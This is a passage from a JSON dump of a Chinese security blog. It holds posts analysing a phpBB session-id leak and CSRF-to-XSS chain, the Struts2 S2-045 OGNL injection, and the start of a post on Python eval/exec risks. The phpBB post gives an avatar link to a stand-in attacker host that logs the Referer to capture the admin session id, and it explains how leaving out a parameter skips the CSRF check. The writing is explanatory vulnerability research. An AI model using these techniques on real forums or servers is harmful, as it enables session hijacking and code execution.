alt=\"310095afae1334c5a88e37b2006aea71.png\"></p>\n<p>这个值在系统安装完成之后是固定的，无论什么身份的用户访问都是这个值</p>\n<p>因此，如果管理员访问的url中sid值被泄露，攻击者可以有机会利用这个值构造cookie以便使用管理员身份登录后台</p>\n<p>但是如何获取这个暴露在url中sid值呢?</p>\n<p>由于phpbb的设计特色：当管理员使用完后台功能后想要切换到前台，后台页面中提供了一个跳转到前台地址的按钮</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170004-1f97c952-9e66-1.png\" alt=\"e93afabea080285f472969e7ff95edca.png\"></p>\n<p>当管理员点击这个按钮切换到前台时，url中会带有sid</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170022-2a5eace8-9e66-1.png\" alt=\"4bb9c1259a5bffba9c5c7b0e08103f81.png\"></p>\n<p>其实前台页面的访问并不需要在url中使用sid，但从后台切换过来后url中会默认带上这个值。这就导致本应该只在后台功能url中出现的管理员sid泄露到了管理员访问的前台功能url中，而这个存在于url中的sid值很容易在前台页面加载远程资源时在HTTP_REFERER中被泄露</p>\n<p>例如：在一些phpbb站点中可能会开启远程头像选项</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170036-3311fbe2-9e66-1.png\" alt=\"92ceab7d6b6ca8843b45bb2ac3c3d44c.png\"></p>\n<p>这个功能并不是默认开启的，当此功能开启后，用户可以设置远程头像</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170049-3aa416c4-9e66-1.png\" alt=\"6c5e2ff9e8f384dd1467826dd185fa0b.png\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170103-4306fa0c-9e66-1.png\" alt=\"f382c69315eb5f9220cd80cfdf5ac6ef.png\"></p>\n<p>程序会在使用这个远程头像的时候将其加载进来</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170118-4beebc68-9e66-1.png\" alt=\"aec8701acb8a37e80e276828058bf057.png\"></p>\n<p>如果管理员此时访问的页面在渲染时加载了攻击者的远程头像，且此时管理员访问的url中带有sid，sid将会被泄露</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170130-5342150a-9e66-1.png\" alt=\"44e1b0231b2d0466eb63be98864f1603.png\"></p>\n<p>我们是否可以构造一个恶意的远程图片链接poc，用以接收管理员的sid呢？</p>\n<p>首先看一下phpBB在后台程序如何校验远程图片链接，phpBB使用getImageSize对用户添加的远程图片链接进行校验</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170144-5b4ed396-9e66-1.png\" alt=\"4b309cf7ce0df6e31d907c347010ba32.png\"></p>\n<p>因此我们可以构造如下poc</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170205-67989128-9e66-1.png\" alt=\"80de40f27885c454864e2d4b1886bd2f.png\"></p>\n<p>poc.php除了需要记录加载该图片请求中的HTTP_REFERER，同时需要将图片进行返回展示</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170224-72f8c43e-9e66-1.png\" alt=\"48634b633fb82765027d6f8930308591.png\"></p>\n<p>构造远程图片链接</p>\n<p><a href=\"http://x.x.x.x/poc.php?avatar.png\">http://x.x.x.x/poc.php?avatar.png</a></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170239-7c227532-9e66-1.png\" alt=\"8fa0e04de5df1cdda948464ae4cc350d.png\"></p>\n<p>攻击者的头像加载成功</p>\n<p>但是如何使得管理员加载这个头像资源呢？</p>\n<p>只要给管理员留言，或者评论管理员发布的文章即可</p>\n<p>以评论文章为例：当针对管理员发布的文章发表一条评论之后，管理员在前端页面即可收到一个消息提示</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170253-84991da6-9e66-1.png\" alt=\"e1213eef63131716b7710bb5c4ce0392.png\"></p>\n<p>点看之后可以看到被加载的头像</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170305-8b5b0d20-9e66-1.png\" alt=\"8966297ebff91c3afdf6865cff15e346.png\"></p>\n<p>但无论管理员点开与否，在phpbb首页加载时，都会远程加载这个资源，HTTP_REFERER都会被发送到攻击者的服务器上</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170318-93a33b88-9e66-1.png\" alt=\"e321b34e590a226b8abd3aa1b8262f9c.png\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170334-9ca75af2-9e66-1.png\" alt=\"946f0ef1b05ee18165001d78fcd5a886.png\"></p>\n<p>到此为止，攻击者可以顺利获得sid值。但为什么上文说获取了sid值也不一定可以盗用管理员身份登录系统呢？</p>\n<p>在phpBB中有如下的安全策略</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170348-a57abc82-9e66-1.png\" alt=\"e661d57f2a320a6b09176dfd1f3d8dc0.png\"></p>\n<p>Session IP validation选项用来验证当前用户会话绑定的IP；All选项代表匹配完整地址，A.B.C选项匹配前面的x.x.x段，A.B选项匹配x.x，None选项关闭IP检查。</p>\n<p>这项安全策略是用来检验用户sid与IP的绑定关系，系统默认采用A.B.C选项，因此攻击者在获取了管理员sid后，想要冒用身份也是很困难的。</p>\n<p>然而这也不是无解的：</p>\n<p>phpBB后台管理中包含着编辑BBCode的功能。</p>\n<p>BBCode是Bulletin Board Code的缩写，也有译为「BB代码」的，属于轻量标记语言（Lightweight Markup Language）的一种，如字面上所显示的，它主要是使用在BBS、论坛、Blog等网络应用上。BBcode的语法通常为 [标记] 这种形式，即语法左右用两个中括号包围，以作为与正常文字间的区别。系统解译时遇上中括号便知道该处是BBcode，会在解译结果输出到用户端时转换成最为通用的HTML语法。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170416-b63fa4d8-9e66-1.png\" alt=\"285e9bb6f0740bb0c8f2c109500661ec.png\"></p>\n<p>当然，作为后台管理功能，访问此处url也需要sid</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170434-c06c87fa-9e66-1.png\" alt=\"d54b78b87df2e8186c7da1dd68b3b648.png\"></p>\n<p>由于上文的利用，攻击者可以获取sid，因此这里可以确定管理员此处后台功能的确切url</p>\n<p>在此页面上，管理员可以添加，删除和编辑自定义BBCode。假如定义了这样的BBCode</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170451-ca9e70da-9e66-1.png\" alt=\"35e14edd5986fb0cf3cfd10f6dd58fa7.png\"></p>\n<p>用户可以在PM、话题或者帖子中使用这个BBCode</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170529-e1561742-9e66-1.png\" alt=\"c08656b2ebd26a2aec703d2cc825b620.png\"></p>\n<p>结果如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170548-eca11f8e-9e66-1.png\" alt=\"0e0de6e356c7d1d5390ad45804c3db75.png\"></p>\n<p>然而phpBB中编辑BBCode的功能存在CSRF问题，首先看一下编辑BBCode功能的后台代码</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170600-f3f10d9e-9e66-1.png\" alt=\"e3d599d122532f6b9197f6d1912be7fe.png\"></p>\n<p>可以看到，这里的确有对csrf进行防范</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170614-fc17bd9c-9e66-1.png\" alt=\"45c2fe3f8d30a68f42780e666a1d9c07.png\"></p>\n<p>但是问题出在了前面的$submit参数：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170626-035c9a1e-9e67-1.png\" alt=\"a64a118a0f84975f378f6b70a61c5915.png\"></p>\n<p>只有提交的POST请求中存在submit参数，系统才会检查CSRF nonce。反之不会</p>\n<p>因此，只要构造csrf时，请求中不带submit参数即可</p>\n<p>$action、$bbcode_id、$bbcode_match与$bbcode_tpl参数均有$request-&gt;variable方式获取而来</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170647-0fb874c2-9e67-1.png\" alt=\"b413f7d8cc4e07f361d7b53770f9aa29.png\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200525170659-175321a0-9e67-1.png\" alt=\"81801c2f696b331b523458c65342d9c1.png\"></p>\n<p>variable方法不仅会获取POST中提交的变量，也会获取通过GET提交的变量，这意味着攻击者可以通过GET参数传参来进行CSRF攻击。</p>\n<p>当csrf攻击成功后，恶意的bbcode将会被添加。之后攻击者可以滥用这个bbcode短代码，在消息、话题、帖子、回复中执行任意XSS代码。</p>\n"},{"title":"Struts2 S2-045漏洞分析","date":"2019-08-06T06:31:17.000Z","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/lMWQlF.md.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nApache Struts2存在远程代码执行漏洞，攻击者可以将恶意代码通过http报文头部的Content-Type字段传递给存在漏洞的服务器，从而导致了任意代码执行漏洞\n\n<!--more-->\n\n漏洞分析\n--------\n\nS2-045漏洞的poc如下。该poc是漏洞发现者——安恒的 Nike Zheng编写的\n\n![lMWPSS.png](https://s2.ax1x.com/2019/12/30/lMWPSS.png)\n\n在分析过poc之后发现，payload是从content-type字段中传入的\n\n我们使用了对应版本struts2官方案例app struts2-showcase来搭建漏洞环境\n\n首先看一下案例中struts2-showcase中的web.xml\n\n![lMRlVI.png](https://s2.ax1x.com/2019/12/30/lMRlVI.png)\n\n可以看出struts2-showcase使用StrutsPrepareFilter作为过滤器\n\n因此我们在StrutsPrepareFilter中doFilter方法中下断，执行poc并发送本次漏洞的利用请求\n\n![lMRuKH.png](https://s2.ax1x.com/2019/12/30/lMRuKH.png)\n\n上图可见，程序执行到StrutsPrepareFilter中doFilter方法，doFilter方法中，程序将执行prepare.wrapRequest以进行request处理分支\n\n跟入prepare.wrapRequest\n\n![lMRtxg.png](https://s2.ax1x.com/2019/12/30/lMRtxg.png)\n\n在prepare.wrapRequest中，调用dispatcher.wrapRequest对request进行处理\n\n跟入dispatcher.wrapRequest\n\n![lMRmxe.png](https://s2.ax1x.com/2019/12/30/lMRmxe.png)\n\n见上图红框处的if分支。当content-type为”multipart/form-data”时进入该if分支，在该if分支中将调用MultiPartRequestWrapper生成一个名为request的实例\n\n继续跟入MultiPartRequestWrapper类，进入其构造方法MultiPartRequestWrapper，见下图\n\n![lMRJG8.png](https://s2.ax1x.com/2019/12/30/lMRJG8.png)\n\n可见request请求被传入上图84行中parse方法中\n\n继续跟入parse方法\n\n![lMRZ8O.png](https://s2.ax1x.com/2019/12/30/lMRZ8O.png)\n\n在parse方法中，当\"Content-Type\"格式错误时，会出现异常，进入catch分支，程序最终会执行到105行处buildErrorMessage方法处\n\n跟入buildErrorMessage方法\n\n![lMRGPf.png](https://s2.ax1x.com/2019/12/30/lMRGPf.png)\n\nbuildErrorMessage方法中的localizedTextUtil.findText会执行ognl表达式，从而导致命令执行。注意上图123断点处，程序将e.getMessage()传入localizedTextUtil.findText，而e.getMessage()正是我们构造的payload\n\n继续跟入findText\n\n![lMRarj.png](https://s2.ax1x.com/2019/12/30/lMRarj.png)\n\n可见findText中的defaultMessage参数即为我们构造的payload，也就是上一步传入的e.getMessage()\n\n接着，findText会将defaultMessage传入getDefaulMessage方法中，见下图\n\n![lMR1at.png](https://s2.ax1x.com/2019/12/30/lMR1at.png)\n\n继续跟入GetDefaultMessageReturnArg方法\n\n![lMRKrd.png](https://s2.ax1x.com/2019/12/30/lMRKrd.png)\n\n可见payload又被传递到TextParseUtil.translateVariables中\n\n![lMRdqs.png](https://s2.ax1x.com/2019/12/30/lMRdqs.png)\n\n继续跟入TextParseUtil.translateVariables\n\n![lMRyGT.png](https://s2.ax1x.com/2019/12/30/lMRyGT.png)\n\n继续跟入parser.evaluate\n\n![lMRBaq.png](https://s2.ax1x.com/2019/12/30/lMRBaq.png)\n\n![lMRUMQ.png](https://s2.ax1x.com/2019/12/30/lMRUMQ.png)\n\n最终在parser.evaluate里执行ognl语句。\n\n写在最后\n--------\n\n回顾之前的S2-001漏洞，不得不说，S2-045的执行点与S2-001漏洞的执行点极其相似\n\n我们看一下S2-045最终的执行点:\n\n位于Com\\\\opensymphony\\\\xwork2\\\\util\\\\OgnlTextParser.java\n\n![lMRYRS.png](https://s2.ax1x.com/2019/12/30/lMRYRS.png)\n\n再看一下S2-001最终的执行点:\n\n位于\\\\com\\\\opensymphony\\\\xwork2\\\\util\\\\TextParseUtil.java\n\n![lMR0Zn.png](https://s2.ax1x.com/2019/12/30/lMR0Zn.png)\n\n代码结构几乎完全一样","source":"_posts/s2-45.md","raw":"---\ntitle: Struts2 S2-045漏洞分析\ndate: 2019-8-6 14:31:17\ntags: [web漏洞分析 ,java]\ncategories: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/lMWQlF.md.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nApache Struts2存在远程代码执行漏洞，攻击者可以将恶意代码通过http报文头部的Content-Type字段传递给存在漏洞的服务器，从而导致了任意代码执行漏洞\n\n<!--more-->\n\n漏洞分析\n--------\n\nS2-045漏洞的poc如下。该poc是漏洞发现者——安恒的 Nike Zheng编写的\n\n![lMWPSS.png](https://s2.ax1x.com/2019/12/30/lMWPSS.png)\n\n在分析过poc之后发现，payload是从content-type字段中传入的\n\n我们使用了对应版本struts2官方案例app struts2-showcase来搭建漏洞环境\n\n首先看一下案例中struts2-showcase中的web.xml\n\n![lMRlVI.png](https://s2.ax1x.com/2019/12/30/lMRlVI.png)\n\n可以看出struts2-showcase使用StrutsPrepareFilter作为过滤器\n\n因此我们在StrutsPrepareFilter中doFilter方法中下断，执行poc并发送本次漏洞的利用请求\n\n![lMRuKH.png](https://s2.ax1x.com/2019/12/30/lMRuKH.png)\n\n上图可见，程序执行到StrutsPrepareFilter中doFilter方法，doFilter方法中，程序将执行prepare.wrapRequest以进行request处理分支\n\n跟入prepare.wrapRequest\n\n![lMRtxg.png](https://s2.ax1x.com/2019/12/30/lMRtxg.png)\n\n在prepare.wrapRequest中，调用dispatcher.wrapRequest对request进行处理\n\n跟入dispatcher.wrapRequest\n\n![lMRmxe.png](https://s2.ax1x.com/2019/12/30/lMRmxe.png)\n\n见上图红框处的if分支。当content-type为”multipart/form-data”时进入该if分支，在该if分支中将调用MultiPartRequestWrapper生成一个名为request的实例\n\n继续跟入MultiPartRequestWrapper类，进入其构造方法MultiPartRequestWrapper，见下图\n\n![lMRJG8.png](https://s2.ax1x.com/2019/12/30/lMRJG8.png)\n\n可见request请求被传入上图84行中parse方法中\n\n继续跟入parse方法\n\n![lMRZ8O.png](https://s2.ax1x.com/2019/12/30/lMRZ8O.png)\n\n在parse方法中，当\"Content-Type\"格式错误时，会出现异常，进入catch分支，程序最终会执行到105行处buildErrorMessage方法处\n\n跟入buildErrorMessage方法\n\n![lMRGPf.png](https://s2.ax1x.com/2019/12/30/lMRGPf.png)\n\nbuildErrorMessage方法中的localizedTextUtil.findText会执行ognl表达式，从而导致命令执行。注意上图123断点处，程序将e.getMessage()传入localizedTextUtil.findText，而e.getMessage()正是我们构造的payload\n\n继续跟入findText\n\n![lMRarj.png](https://s2.ax1x.com/2019/12/30/lMRarj.png)\n\n可见findText中的defaultMessage参数即为我们构造的payload，也就是上一步传入的e.getMessage()\n\n接着，findText会将defaultMessage传入getDefaulMessage方法中，见下图\n\n![lMR1at.png](https://s2.ax1x.com/2019/12/30/lMR1at.png)\n\n继续跟入GetDefaultMessageReturnArg方法\n\n![lMRKrd.png](https://s2.ax1x.com/2019/12/30/lMRKrd.png)\n\n可见payload又被传递到TextParseUtil.translateVariables中\n\n![lMRdqs.png](https://s2.ax1x.com/2019/12/30/lMRdqs.png)\n\n继续跟入TextParseUtil.translateVariables\n\n![lMRyGT.png](https://s2.ax1x.com/2019/12/30/lMRyGT.png)\n\n继续跟入parser.evaluate\n\n![lMRBaq.png](https://s2.ax1x.com/2019/12/30/lMRBaq.png)\n\n![lMRUMQ.png](https://s2.ax1x.com/2019/12/30/lMRUMQ.png)\n\n最终在parser.evaluate里执行ognl语句。\n\n写在最后\n--------\n\n回顾之前的S2-001漏洞，不得不说，S2-045的执行点与S2-001漏洞的执行点极其相似\n\n我们看一下S2-045最终的执行点:\n\n位于Com\\\\opensymphony\\\\xwork2\\\\util\\\\OgnlTextParser.java\n\n![lMRYRS.png](https://s2.ax1x.com/2019/12/30/lMRYRS.png)\n\n再看一下S2-001最终的执行点:\n\n位于\\\\com\\\\opensymphony\\\\xwork2\\\\util\\\\TextParseUtil.java\n\n![lMR0Zn.png](https://s2.ax1x.com/2019/12/30/lMR0Zn.png)\n\n代码结构几乎完全一样","slug":"s2-45","published":1,"updated":"2020-10-27T09:25:29.635Z","_id":"ckgrozu9t0048wsa97qtz942b","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Apache Struts2存在远程代码执行漏洞，攻击者可以将恶意代码通过http报文头部的Content-Type字段传递给存在漏洞的服务器，从而导致了任意代码执行漏洞</p>\n<a id=\"more\"></a>\n\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>S2-045漏洞的poc如下。该poc是漏洞发现者——安恒的 Nike Zheng编写的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMWPSS.png\" alt=\"lMWPSS.png\"></p>\n<p>在分析过poc之后发现，payload是从content-type字段中传入的</p>\n<p>我们使用了对应版本struts2官方案例app struts2-showcase来搭建漏洞环境</p>\n<p>首先看一下案例中struts2-showcase中的web.xml</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMRlVI.png\" alt=\"lMRlVI.png\"></p>\n<p>可以看出struts2-showcase使用StrutsPrepareFilter作为过滤器</p>\n<p>因此我们在StrutsPrepareFilter中doFilter方法中下断，执行poc并发送本次漏洞的利用请求</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMRuKH.png\" alt=\"lMRuKH.png\"></p>\n<p>上图可见，程序执行到StrutsPrepareFilter中doFilter方法，doFilter方法中，程序将执行prepare.wrapRequest以进行request处理分支</p>\n<p>跟入prepare.wrapRequest</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMRtxg.png\" alt=\"lMRtxg.png\"></p>\n<p>在prepare.wrapRequest中，调用dispatcher.wrapRequest对request进行处理</p>\n<p>跟入dispatcher.wrapRequest</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMRmxe.png\" alt=\"lMRmxe.png\"></p>\n<p>见上图红框处的if分支。当content-type为”multipart/form-data”时进入该if分支，在该if分支中将调用MultiPartRequestWrapper生成一个名为request的实例</p>\n<p>继续跟入MultiPartRequestWrapper类，进入其构造方法MultiPartRequestWrapper，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMRJG8.png\" alt=\"lMRJG8.png\"></p>\n<p>可见request请求被传入上图84行中parse方法中</p>\n<p>继续跟入parse方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMRZ8O.png\" alt=\"lMRZ8O.png\"></p>\n<p>在parse方法中，当”Content-Type”格式错误时，会出现异常，进入catch分支，程序最终会执行到105行处buildErrorMessage方法处</p>\n<p>跟入buildErrorMessage方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMRGPf.png\" alt=\"lMRGPf.png\"></p>\n<p>buildErrorMessage方法中的localizedTextUtil.findText会执行ognl表达式，从而导致命令执行。注意上图123断点处，程序将e.getMessage()传入localizedTextUtil.findText，而e.getMessage()正是我们构造的payload</p>\n<p>继续跟入findText</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMRarj.png\" alt=\"lMRarj.png\"></p>\n<p>可见findText中的defaultMessage参数即为我们构造的payload，也就是上一步传入的e.getMessage()</p>\n<p>接着，findText会将defaultMessage传入getDefaulMessage方法中，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMR1at.png\" alt=\"lMR1at.png\"></p>\n<p>继续跟入GetDefaultMessageReturnArg方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMRKrd.png\" alt=\"lMRKrd.png\"></p>\n<p>可见payload又被传递到TextParseUtil.translateVariables中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMRdqs.png\" alt=\"lMRdqs.png\"></p>\n<p>继续跟入TextParseUtil.translateVariables</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMRyGT.png\" alt=\"lMRyGT.png\"></p>\n<p>继续跟入parser.evaluate</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMRBaq.png\" alt=\"lMRBaq.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMRUMQ.png\" alt=\"lMRUMQ.png\"></p>\n<p>最终在parser.evaluate里执行ognl语句。</p>\n<h2 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h2><p>回顾之前的S2-001漏洞，不得不说，S2-045的执行点与S2-001漏洞的执行点极其相似</p>\n<p>我们看一下S2-045最终的执行点:</p>\n<p>位于Com\\opensymphony\\xwork2\\util\\OgnlTextParser.java</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMRYRS.png\" alt=\"lMRYRS.png\"></p>\n<p>再看一下S2-001最终的执行点:</p>\n<p>位于\\com\\opensymphony\\xwork2\\util\\TextParseUtil.java</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/30/lMR0Zn.png\" alt=\"lMR0Zn.png\"></p>\n<p>代码结构几乎完全一样</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>Apache Struts2存在远程代码执行漏洞，攻击者可以将恶意代码通过http报文头部的Content-Type字段传递给存在漏洞的服务器，从而导致了任意代码执行漏洞</p>","more":"<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>S2-045漏洞的poc如下。该poc是漏洞发现者——安恒的 Nike Zheng编写的</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMWPSS.png\" alt=\"lMWPSS.png\"></p>\n<p>在分析过poc之后发现，payload是从content-type字段中传入的</p>\n<p>我们使用了对应版本struts2官方案例app struts2-showcase来搭建漏洞环境</p>\n<p>首先看一下案例中struts2-showcase中的web.xml</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMRlVI.png\" alt=\"lMRlVI.png\"></p>\n<p>可以看出struts2-showcase使用StrutsPrepareFilter作为过滤器</p>\n<p>因此我们在StrutsPrepareFilter中doFilter方法中下断，执行poc并发送本次漏洞的利用请求</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMRuKH.png\" alt=\"lMRuKH.png\"></p>\n<p>上图可见，程序执行到StrutsPrepareFilter中doFilter方法，doFilter方法中，程序将执行prepare.wrapRequest以进行request处理分支</p>\n<p>跟入prepare.wrapRequest</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMRtxg.png\" alt=\"lMRtxg.png\"></p>\n<p>在prepare.wrapRequest中，调用dispatcher.wrapRequest对request进行处理</p>\n<p>跟入dispatcher.wrapRequest</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMRmxe.png\" alt=\"lMRmxe.png\"></p>\n<p>见上图红框处的if分支。当content-type为”multipart/form-data”时进入该if分支，在该if分支中将调用MultiPartRequestWrapper生成一个名为request的实例</p>\n<p>继续跟入MultiPartRequestWrapper类，进入其构造方法MultiPartRequestWrapper，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMRJG8.png\" alt=\"lMRJG8.png\"></p>\n<p>可见request请求被传入上图84行中parse方法中</p>\n<p>继续跟入parse方法</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMRZ8O.png\" alt=\"lMRZ8O.png\"></p>\n<p>在parse方法中，当”Content-Type”格式错误时，会出现异常，进入catch分支，程序最终会执行到105行处buildErrorMessage方法处</p>\n<p>跟入buildErrorMessage方法</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMRGPf.png\" alt=\"lMRGPf.png\"></p>\n<p>buildErrorMessage方法中的localizedTextUtil.findText会执行ognl表达式，从而导致命令执行。注意上图123断点处，程序将e.getMessage()传入localizedTextUtil.findText，而e.getMessage()正是我们构造的payload</p>\n<p>继续跟入findText</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMRarj.png\" alt=\"lMRarj.png\"></p>\n<p>可见findText中的defaultMessage参数即为我们构造的payload，也就是上一步传入的e.getMessage()</p>\n<p>接着，findText会将defaultMessage传入getDefaulMessage方法中，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMR1at.png\" alt=\"lMR1at.png\"></p>\n<p>继续跟入GetDefaultMessageReturnArg方法</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMRKrd.png\" alt=\"lMRKrd.png\"></p>\n<p>可见payload又被传递到TextParseUtil.translateVariables中</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMRdqs.png\" alt=\"lMRdqs.png\"></p>\n<p>继续跟入TextParseUtil.translateVariables</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMRyGT.png\" alt=\"lMRyGT.png\"></p>\n<p>继续跟入parser.evaluate</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMRBaq.png\" alt=\"lMRBaq.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMRUMQ.png\" alt=\"lMRUMQ.png\"></p>\n<p>最终在parser.evaluate里执行ognl语句。</p>\n<h2 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h2><p>回顾之前的S2-001漏洞，不得不说，S2-045的执行点与S2-001漏洞的执行点极其相似</p>\n<p>我们看一下S2-045最终的执行点:</p>\n<p>位于Com\\opensymphony\\xwork2\\util\\OgnlTextParser.java</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMRYRS.png\" alt=\"lMRYRS.png\"></p>\n<p>再看一下S2-001最终的执行点:</p>\n<p>位于\\com\\opensymphony\\xwork2\\util\\TextParseUtil.java</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/30/lMR0Zn.png\" alt=\"lMR0Zn.png\"></p>\n<p>代码结构几乎完全一样</p>"},{"title":"Python中有潜在代码执行风险的函数(一)","date":"2019-12-10T09:34:16.000Z","categorise":"技术","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/timg.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n在Python中一些函数存在着任意代码执行的隐患，错误的使用这些方法将会导致漏洞的产生，攻击者可能会利用这些安全隐患进行攻击。\n\n文中的知识点并非新知识，但我会围绕着基础点比较细致的分析漏洞的成因、防范以及绕过，希望对大家有帮助\n\n<!--more-->\n\n# **第一组**\n\n首先介绍下python中常见的存在任意代码执行隐患的方法：eval与exec\n\n简介\n----\n\n在python中，eval和exec的用法极其相似。eval和exec都可以将传入的字符串执行，但两者又有不同之处：\n\n### eval\n\neval是一个python内置函数，语法为eval(*expression*, *globals=None*,*locals=None*)\n\neval函数接收三个参数：其中 expression\n参数是用做运算的字符串类型表达式；globals参数用于指定运行时的全局命名空间；Locals参数用于指定运行时的局部命名空间。globals与 locals 是可选参数，默认值是 None，他们只在运算时起作用，运算后则销毁。\n\n### exec\n\n在Python2中exec是一个内置语句(statement)而不是一个函数，但是到了Python3中exec将Python2中作为内置语句的exec和execfile()函数功能整合到一起，成为了一个新的函数，语法为exec(*object*[, *globals*[,*locals*]])\n\nexec的第一个参数可以是code object，因此它可以执行复杂的代码逻辑，例如变量赋值操作等，这一点是eval做不到的。但exec返回值永远为 None，因此exec不能像eval一样将计算结果返回。exec的后两个参数与eval一致\n\n关于二者的区别，可以见下面的几组代码\n\n1、eval与exec在执行 